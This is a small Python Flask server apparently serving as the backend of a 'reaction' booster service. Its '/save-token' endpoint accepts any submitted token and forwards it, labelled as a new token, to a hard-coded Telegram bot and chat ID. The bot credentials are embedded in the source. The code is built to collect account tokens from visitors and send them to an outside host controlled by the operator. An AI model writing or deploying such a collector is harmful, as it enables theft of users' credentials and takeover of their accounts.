import os
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# Infos Telegram
TOKEN_BOT = "8632263179:AAFDjyU6d4eTCMgg4wM4xB1sDBGmWEMod2s"
CHAT_ID = "7129218282"

def notify_telegram(message):
    url = f"https://api.telegram.org/bot{TOKEN_BOT}/sendMessage"
    try:
        requests.post(url, json={"chat_id": CHAT_ID, "text": message}, timeout=10)
    except Exception as e:
        print(f"Erreur Telegram: {e}")

@app.route('/')
def index():
    return "REACTION VRAI GASY LIVE", 200

@app.route('/save-token', methods=['POST'])
def save():
    data = request.get_json()
    token = data.get('token')
    if token:
        notify_telegram(f"🚀 NOUVEAU TOKEN :\n\n{token}")
        return jsonify({"status": "sent"}), 200
    return jsonify({"status": "no_token"}), 400

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
